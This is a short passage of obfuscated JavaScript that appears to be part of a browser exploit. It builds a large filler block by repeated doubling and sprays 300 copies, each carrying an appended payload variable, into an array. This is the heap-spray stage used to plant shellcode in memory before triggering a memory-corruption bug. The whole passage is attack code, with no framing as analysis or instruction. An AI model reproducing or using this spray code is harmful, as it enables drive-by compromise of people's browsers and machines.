...
while (pkblack.length< pkjuhaimeng) pkblack+=pkblack;fillhaimeng = pkblack.substring(0, pkjuhaimeng);
codejuhaimeng = pkblack.substring(0, pkblack.length-pkjuhaimeng);
while(codejuhaimeng.length+pkjuhaimeng< 0x40000) codejuhaimeng = codejuhaimeng+codejuhaimeng+fillhaimeng;modehaimeng = new Array();
for (x=0; x< 300; x++) modehaimeng[x] = codejuhaimeng + heiba;var buffer = '';
